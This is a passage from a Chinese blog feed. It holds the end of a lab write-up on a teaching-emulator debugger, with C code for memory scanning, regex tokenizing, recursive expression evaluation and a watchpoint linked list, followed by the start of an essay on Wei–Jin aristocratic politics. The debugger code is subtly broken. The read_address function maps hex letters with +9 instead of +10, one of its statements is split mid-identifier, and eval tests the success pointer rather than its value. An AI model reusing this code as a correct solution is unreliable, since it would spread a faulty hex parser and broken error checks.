<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_x</span><span class="params">(<span class="keyword">char</span>* args)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(args == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> num = <span class="number">0</span>, addr;</span><br><span class="line">	<span class="keyword">while</span>(args[<span class="number">0</span>] == <span class="string">' '</span>)++args;	<span class="comment">//trim</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="string">'0'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'9'</span>) num = (num &lt;&lt; <span class="number">3</span>) + (num &lt;&lt; <span class="number">1</span>) + (args[<span class="number">0</span>] &amp; <span class="number">15</span>), ++args;</span><br><span class="line">	<span class="comment">//get num</span></span><br><span class="line">	<span class="keyword">while</span>(args[<span class="number">0</span>] == <span class="string">' '</span>)++args; <span class="comment">//trim</span></span><br><span class="line">	<span class="comment">//get address</span></span><br><span class="line">	<span class="keyword">if</span>(args[<span class="number">0</span>] == <span class="string">'0'</span> &amp;&amp; args[<span class="number">1</span>] == <span class="string">'x'</span>)&#123;</span><br><span class="line">		args = args + <span class="number">2</span>;</span><br><span class="line">		addr = read_address(args);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(num) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"address 0x%x:"</span>, addr);</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">4</span>; i++)<span class="built_in">printf</span>(<span class="string">" 0x%x"</span>, swaddr_read(addr + i, <span class="number">1</span>));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">			addr += <span class="number">4</span>;</span><br><span class="line">			--num;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\033[1;31mInvalid expression\n\033[0m"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先清除空格，然后读入数字并将数字求值，然后再读入地址将地址进行求值，我们写了一个解析地址的函数<code>read_address()</code>进行解析。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//read address</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">read_address</span><span class="params">(<span class="keyword">char</span> *args)</span></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> address;</span><br><span class="line">	address = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>((<span class="string">'0'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'9'</span>) || (<span class="string">'a'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'f'</span>) || (<span class="string">'A'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'F'</span>))&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="string">'0'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'9'</span>) </span><br><span class="line">                    address = (address&lt;&lt;<span class="number">4</span>)+((args[<span class="number">0</span>]-<span class="string">'0'</span>));</span><br><span class="line">				<span class="keyword">if</span>(<span class="string">'a'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'f'</span>) </span><br><span class="line">                    address = (address&lt;&lt;<span class="number">4</span>)+((args[<span class="number">0</span>]-<span class="string">'a'</span>)+<span class="number">9</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="string">'A'</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">'F'</span>) a</span><br><span class="line">                    ddress = (address&lt;&lt;<span class="number">4</span>)+((args[<span class="number">0</span>]-<span class="string">'A'</span>)+<span class="number">9</span>);</span><br><span class="line">				++args;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先判断是否输入的是否为16进制数，如果不是则返回，否则则解析地址。将数字和地址解析完成后就可以使用内置的<code>swaddr_read</code>函数进行读取地址信息。</p>
<h4 id="数学表达式求值"><a class="markdownIt-Anchor" href="#数学表达式求值"></a> 数学表达式求值</h4>
<p>在本题中，我们主要需要为表达式添加规则，使用正则表达式为表达式每个可能出现的字符添加规则，并为其制定优先级来对其进行词法分析，最后再对其进行递归求值。</p>
<p>首先完成字符的正则表达式的匹配：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> *regex;</span><br><span class="line">	<span class="keyword">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Add more rules.</span></span><br><span class="line"><span class="comment">	 * Pay attention to the precedence level of different rules.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	&#123;<span class="string">" +"</span>,	NOTYPE&#125;,				<span class="comment">//spaces</span></span><br><span class="line">	&#123;<span class="string">"\\+"</span>, PLUS&#125;,					<span class="comment">//plus</span></span><br><span class="line">	&#123;<span class="string">"-"</span>, MINUS&#125;,					<span class="comment">//minus</span></span><br><span class="line">	&#123;<span class="string">"\\*"</span>, STAR&#125;,					<span class="comment">//star</span></span><br><span class="line">	&#123;<span class="string">"/"</span>, DIV&#125;,						<span class="comment">//div</span></span><br><span class="line">	&#123;<span class="string">"=="</span>, EQ&#125;,						<span class="comment">//eq</span></span><br><span class="line">	&#123;<span class="string">"!="</span>, NOTEQ&#125;,					<span class="comment">//noteq</span></span><br><span class="line">	&#123;<span class="string">"&amp;&amp;"</span>, AND&#125;,					<span class="comment">//and</span></span><br><span class="line">	&#123;<span class="string">"\\|\\|"</span>, OR&#125;,					<span class="comment">//or</span></span><br><span class="line">	&#123;<span class="string">"!"</span>, NOT&#125;,						<span class="comment">//not</span></span><br><span class="line">	&#123;<span class="string">"\\("</span>, LB&#125;,					<span class="comment">//lb</span></span><br><span class="line">	&#123;<span class="string">"\\)"</span>, RB&#125;,					<span class="comment">//rb</span></span><br><span class="line">	&#123;<span class="string">"0[xX][0-9a-zA-Z]+"</span>, HEX&#125;,		<span class="comment">//hex</span></span><br><span class="line">	&#123;<span class="string">"[0-9]+"</span>, DEC&#125;,				<span class="comment">//dec</span></span><br><span class="line">	&#123;<span class="string">"\\$[a-z]+"</span>, REG&#125;				<span class="comment">//reg</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在代码中我们为可能出现的字符进行了正则表达式的匹配。然后我们需要将识别出的token信息加入tokens数组中。在for循环中，用<code>regexec()</code>函数匹配目标文本字符串和前面定义的rules[i]中的正则表达式比较，pmatch.rm_so == 0表示匹配串在目标串的第一个位置，pmatch.rm_eo表示结束位置，position和substr_len表示读取完后的位置和读取长度。成功识别得到该字符或者字符串的对应规则后，用switch语句将表达式中每一个部分用对应的数字表示type，复制到tokens[nr_token].str中，用strncpy函数，末尾加上\0表示字符串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">make_token</span><span class="params">(<span class="keyword">char</span> *e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">position</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">regmatch_t</span> pmatch;</span><br><span class="line">	</span><br><span class="line">	nr_token = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(e[<span class="built_in">position</span>] != <span class="string">'\0'</span>) &#123;</span><br><span class="line">		<span class="comment">/* Try all rules one by one. */</span></span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NR_REGEX; i ++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(regexec(&amp;re[i], e + <span class="built_in">position</span>, <span class="number">1</span>, &amp;pmatch, <span class="number">0</span>) == <span class="number">0</span> &amp;&amp; pmatch.rm_so == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">//char *substr_start = e + position;</span></span><br><span class="line">				<span class="keyword">int</span> substr_len = pmatch.rm_eo;</span><br><span class="line">				<span class="comment">//Log("match rules[%d] = \"%s\" at position %d with len %d: %.*s", i, rules[i].regex, position, substr_len, substr_len, substr_start);</span></span><br><span class="line">				<span class="built_in">position</span> += substr_len;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* <span class="doctag">TODO:</span> Now a new token is recognized with rules[i]. Add codes</span></span><br><span class="line"><span class="comment">				 * to record the token in the array `tokens'. For certain types</span></span><br><span class="line"><span class="comment">				 * of tokens, some extra actions should be performed.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">switch</span>(rules[i].token_type) &#123;</span><br><span class="line">					<span class="keyword">case</span> NOTYPE:</span><br><span class="line">						<span class="keyword">break</span>;											<span class="comment">//It's blank!</span></span><br><span class="line">					<span class="keyword">case</span> HEX:<span class="keyword">case</span> DEC:<span class="keyword">case</span> REG:</span><br><span class="line">						<span class="built_in">strncpy</span>(tokens[nr_token].str, e + <span class="built_in">position</span> - substr_len, substr_len);<span class="comment">//regs or number</span></span><br><span class="line">						tokens[nr_token].str[substr_len] = <span class="string">'\0'</span>;		<span class="comment">//add '\0', it's very important</span></span><br><span class="line">						<span class="comment">//WARNING: 64 may be a little small...</span></span><br><span class="line">					<span class="keyword">default</span>:</span><br><span class="line">						<span class="keyword">if</span>(rules[i].token_type == MINUS) &#123;	<span class="comment">//solve neg</span></span><br><span class="line">							<span class="keyword">if</span>(nr_token == <span class="number">0</span>) tokens[nr_token++].type = NEG;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span>(PLUS &lt;= tokens[nr_token - <span class="number">1</span>].type &amp;&amp; tokens[nr_token - <span class="number">1</span>].type &lt;= LB) &#123;</span><br><span class="line">								tokens[nr_token++].type = NEG;</span><br><span class="line">							&#125; <span class="keyword">else</span> tokens[nr_token++].type = MINUS;</span><br><span class="line">						&#125; <span class="keyword">else</span> <span class="keyword">if</span>(rules[i].token_type == STAR) &#123; <span class="comment">//solve pointer</span></span><br><span class="line">							<span class="keyword">if</span>(nr_token == <span class="number">0</span>) tokens[nr_token++].type = POINTER;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span>(PLUS &lt;= tokens[nr_token - <span class="number">1</span>].type &amp;&amp; tokens[nr_token - <span class="number">1</span>].type &lt;= LB) &#123;</span><br><span class="line">								tokens[nr_token++].type = POINTER;</span><br><span class="line">							&#125; <span class="keyword">else</span> tokens[nr_token++].type = STAR;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							tokens[nr_token++].type = rules[i].token_type;	<span class="comment">//other	</span></span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="comment">//panic("please implement me");</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(i == NR_REGEX) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"no match at position %d\n%s\n%*.s^\n"</span>, <span class="built_in">position</span>, e, <span class="built_in">position</span>, <span class="string">""</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们需要需要将符号匹配的函数补全，函数提供了三个参数，表达式左侧指针l，右侧指针r，以及表示匹配结果的指针sucess，我们需要从左至右遍历token数组，检查其符号是否匹配，遍历的时候如果有左括号咋cnt加1，有右括号则将cnt减1，如果最终cnt不等于0则表示符号不匹配。如果i不等于r且cnt等于0时在表达式中有类似<code>()()</code>这种括号，需要将flag设置为0，否则则设为1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_parentheses</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">bool</span> *success)</span> </span>&#123;<span class="comment">//Check the parentheses, use stack.</span></span><br><span class="line">	*success = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>, flag = <span class="number">1</span>, i;		<span class="comment">//A simple stack</span></span><br><span class="line">	<span class="keyword">for</span>(i = l;i &lt;= r; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == LB) ++cnt;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == RB) --cnt;</span><br><span class="line">		<span class="keyword">if</span>(cnt &lt; <span class="number">0</span>)	<span class="keyword">return</span> *success = <span class="literal">false</span>;<span class="comment">//Bad</span></span><br><span class="line">		<span class="keyword">if</span>(i != r &amp;&amp; cnt == <span class="number">0</span>) flag = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(cnt != <span class="number">0</span>) <span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后我们需要将eval函数填充完，在expr函数中我们调用了make_token函数和eval函数，make_token来判断表达式的格式是否正确，而在eval中我们则需要对表达式进行求值，同check_parentheses函数一样，eval也接受同样三个参数。如果传入的参数l&gt;r则直接将success设为false返回，如果l==r，则需要判断表达式是否为十进制数，十六进制数或者寄存器，若为这其中一种，则返回，否则表达式无意义，返回success为false。</p>
<p>当l&gt;r的时候，则需要先调用check_parentheses函数进行符号判断，如果符号不匹配则直接将success设为false返回。接着判断flag是否为1（即没有类似<code>()()</code>这种括号），为1的情况下则清除左右括号进行递归。否则需要遍历表达式将括号删掉，并且解决优先级的问题。</p>
<p>我们遍历所有的tokens，将符号优先级进行比较，找到优先级最低的符号，设置为now，将now的左边和now的右边分开方便递归。由于取反，取负，指针解引用都是对单侧进行操作且优先级最高，所以需要单独拿出来进行讨论，而其他符号则是对now指针的双侧进行操作，所以需要分别将两侧表达式求值进行递归处理。</p>
<p>最后eval函数及expr函数代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">eval</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">bool</span> *success)</span> </span>&#123;</span><br><span class="line">	*success = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> *success = <span class="literal">false</span>;<span class="comment">// Bad Expression !!</span></span><br><span class="line">	<span class="keyword">if</span>(l == r)&#123;				<span class="comment">//It's a number or reg, otherwise bad expression</span></span><br><span class="line">		<span class="keyword">uint32_t</span> tmp;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == HEX) &#123;</span><br><span class="line">			<span class="built_in">sscanf</span>(tokens[l].str, <span class="string">"%x"</span>, &amp;tmp);</span><br><span class="line">			<span class="keyword">return</span> tmp;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(tokens[l].type == DEC) &#123;</span><br><span class="line">			<span class="built_in">sscanf</span>(tokens[l].str, <span class="string">"%d"</span>, &amp;tmp);</span><br><span class="line">			<span class="keyword">return</span> tmp;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(tokens[l].type == REG) &#123;	<span class="comment">//read register</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"eax"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.eax;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"ecx"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.ecx;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"edx"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.edx;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"ebx"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.ebx;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"esp"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.esp;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"ebp"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.ebp;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"esi"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.esi;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"edi"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.edi;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">"eip"</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.eip;</span><br><span class="line">			<span class="keyword">return</span> *success = <span class="literal">false</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">bool</span> flag = check_parentheses(l, r, success);</span><br><span class="line">	<span class="keyword">if</span>(!success) <span class="keyword">return</span> <span class="number">0</span>;						<span class="comment">//Bad</span></span><br><span class="line">	<span class="keyword">if</span>(flag) <span class="keyword">return</span> eval(l + <span class="number">1</span>, r - <span class="number">1</span>, success);<span class="comment">//OK, remove parentheses</span></span><br><span class="line">	<span class="comment">//Now we should find the dominant token</span></span><br><span class="line">	<span class="keyword">int</span> now = <span class="number">-1</span>, type = <span class="number">0x3f3f3f3f</span>, cnt = <span class="number">0</span>, i;</span><br><span class="line">	<span class="keyword">for</span>(i = l; i &lt;= r; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == LB) ++cnt;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == RB) --cnt;</span><br><span class="line">		<span class="keyword">if</span>(cnt != <span class="number">0</span>) <span class="keyword">continue</span>;	<span class="comment">//In mathched parentheses, pass</span></span><br><span class="line">		<span class="keyword">if</span>(PLUS &lt;= tokens[i].type &amp;&amp; tokens[i].type &lt;= POINTER) &#123;</span><br><span class="line">			<span class="keyword">if</span>(type &gt;= PRE[tokens[i].type]) type = PRE[tokens[i].type], now = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	assert(now != <span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">uint32_t</span> a, b;</span><br><span class="line">	<span class="comment">//solve '!'</span></span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type &gt;= NOT) &#123;</span><br><span class="line">		<span class="comment">//if type&gt;=not, which means other token has been solved</span></span><br><span class="line">		<span class="comment">//so the first token must be NOT or NEG or POINTER</span></span><br><span class="line">		b = eval(l + <span class="number">1</span>, r, success);</span><br><span class="line">		<span class="keyword">if</span>(!(*success)) <span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == NOT) <span class="keyword">return</span> !b;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == NEG) <span class="keyword">return</span> -b;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == POINTER) <span class="keyword">return</span> swaddr_read(b, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	a = eval(l, now - <span class="number">1</span>, success);</span><br><span class="line">	<span class="keyword">if</span>(!(*success))<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	b = eval(now + <span class="number">1</span>, r ,success);</span><br><span class="line">	<span class="keyword">if</span>(!(*success))<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == PLUS) <span class="keyword">return</span> a + b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == STAR) <span class="keyword">return</span> a * b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == DIV) <span class="keyword">return</span> a / b;	</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == MINUS) <span class="keyword">return</span> a - b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == EQ) <span class="keyword">return</span> a == b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == NOTEQ) <span class="keyword">return</span> a != b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == AND) <span class="keyword">return</span> a &amp;&amp; b;</span><br><span class="line">	<span class="keyword">if</span>(tokens[now].type == OR) <span class="keyword">return</span> a || b;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">expr</span><span class="params">(<span class="keyword">char</span> *e, <span class="keyword">bool</span> *success)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!make_token(e)) &#123;</span><br><span class="line">		*success = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Insert codes to evaluate the expression. */</span></span><br><span class="line">	<span class="comment">//panic("please implement me");</span></span><br><span class="line">	<span class="comment">//Calculate the value</span></span><br><span class="line">	<span class="keyword">return</span> eval(<span class="number">0</span>, nr_token - <span class="number">1</span>, success);<span class="comment">//call eval to calculate the value of expression e</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="监视点"><a class="markdownIt-Anchor" href="#监视点"></a> 监视点</h4>
<p>本题较简单，即用一个链表结构维护一个监视点池。即需要实现几个函数，初始化监视点池、新申请一个监视点，释放一个监视点，向监视点插入表达式等方法。</p>
<p>初始化监视点池即将监视点头结点设为空，空闲节点设为整个监视点池</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_wp_pool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NR_WP; i ++) &#123;</span><br><span class="line">		wp_pool[i].NO = i;</span><br><span class="line">		wp_pool[i].next = &amp;wp_pool[i + <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	wp_pool[NR_WP - <span class="number">1</span>].next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	free_ = wp_pool;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新申请一个监视点需要将head节点指向空闲节点，再将空闲节点指向其next节点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">WP* <span class="title">new_wp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	assert(free_ != <span class="literal">NULL</span>);</span><br><span class="line">	WP* ans = free_;</span><br><span class="line">	free_ = ans-&gt;next;</span><br><span class="line">	ans-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移除节点则需要将这个节点从链表中移除出去。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(head == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;NO == id)&#123;</span><br><span class="line">		WP* tmp = head;</span><br><span class="line">		head = head-&gt;next;</span><br><span class="line">		wp_free(tmp);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	WP* now = head;</span><br><span class="line">	<span class="keyword">while</span>(now-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(now-&gt;next-&gt;NO == id) &#123;</span><br><span class="line">			WP* tmp = now-&gt;next;</span><br><span class="line">			now-&gt;next = now-&gt;next-&gt;next;</span><br><span class="line">			wp_free(tmp);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		now = now-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在ui.c的函数中只需要读入参数，调用这些维护监视点池的函数即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>魏晋之际的政治格局简论</title>
    <url>/2020/07/29/1/</url>
    <content><![CDATA[<p>关于东晋之际的门阀政治体系，被视为变态、畸形发展的政治体系，但其出现并非空穴来风。</p>
<p>其一，东汉末年，士人清议之风盛起，出现了匹夫抗愤，处士横议的局面，士人之间互相品题、共相标榜成为一时风气，普通士人一旦为名士所赞赏、品题，便如登龙门，身价倍增，千里求名之举亦不鲜见。尽管汉末党锢之祸对于士人清议进行了严酷镇压，但却加强了士人群体身份的认同，构成汉晋时代“士的觉醒”的重要面向。后来随着一系列事件，此时进入三国鼎立时代。其时曹魏举荐人才的主要方式之一便是名士品评、提携同郡士人，例如当时司马懿曾被同郡河内杨俊、清河崔琰所举荐。通过互相的举荐和品评，可以加强同乡同郡之间的家族关系，并且品评人和被品评人也可以在朝廷中为自己增加政治资源。例如，《三国志.杨俊传》中写道：</p>
<blockquote>
<p>黄初三年，车驾至宛，以市不丰乐，发怒收（杨）俊。尚书仆射司马宣王、常侍王象、荀纬请俊，叩头流血，帝不许。俊曰：“吾知罪矣。”遂自杀，众冤痛之。</p>
</blockquote>
<a id="more"></a>
<p>司马懿、王象、荀纬三人皆为河内人，自然不是一种巧合，体现出同乡官僚在政治上互相支持与提携。其时家族之间的互相品评、联姻，来上升或者加固大族的地位并且由此进行入仕，这无疑可以看做是魏晋时期阶级固化的一个重要原因。</p>
<p>其二，魏晋嬗代发生在三国鼎立之际，其时魏国仍然强敌环伺，蜀将姜维频频北伐。所以魏晋嬗代之际不可能进行大规模的政治清洗。例如高平陵事变，虽说“同日斩戮，名士减半”，但其所株连多是没有什么政治背景之人物。其时仍然大多曹魏元老仍然“心存曹氏”，大规模地进行政治清洗也会使曹魏功臣对司马氏心存憎恶，甚至可能进行政治变动，因此司马家族事实上并不具备大规模政治清洗的客观条件。而曹爽的改革正是由于开罪了曹魏功臣集团，才给司马懿带来了可乘之机。作为这场政治斗争的胜利者，曹爽的前车之鉴，对于司马家族而言显得格外深刻，这也使司马氏更加深切地认识到这些功臣贵戚子弟在曹魏政治中所具有的盘根错节、不可低估的整治潜力。因此，拉拢而不是打击曹魏贵戚子弟成为了司马氏的既定策略，这些曹魏贵戚子弟只要在政治上表示支持司马氏，无论是主动还是勉强，甚至是被迫，只要对司马氏家族专权的局面表示默认，司马氏一般都予以宽容。</p>
<p>因此，在曹爽败亡后，司马懿只是对与其关系最密切的何宴、邓飏、丁谧、李胜等人痛下杀手，而对于曹爽阵营里的声望最高的夏侯玄仅以闲职处之。因此，司马懿上台后的政治诛杀，表面上看来株连不少，但除了曹爽一支外，并没有损害曹魏政权中原有的的权势网络。很多士人虽然曾仕于曹爽，但很多并未遭到株连和问责，很多后来都逐渐转变为司马氏之臣，甚至贾充还成为了司马氏的心腹。</p>
<p>其三，各个世家大族通过品评、联姻等方式进行家族之间的联合，逐渐成为了地域与文化乃至政治方面的认同。出身世家的士人看不起出身寒微之人，对他们在政治上屡加排挤。而由于宗室、功臣形成了一股政治平衡，根基未稳的司马氏亦不敢开罪世家大族。</p>
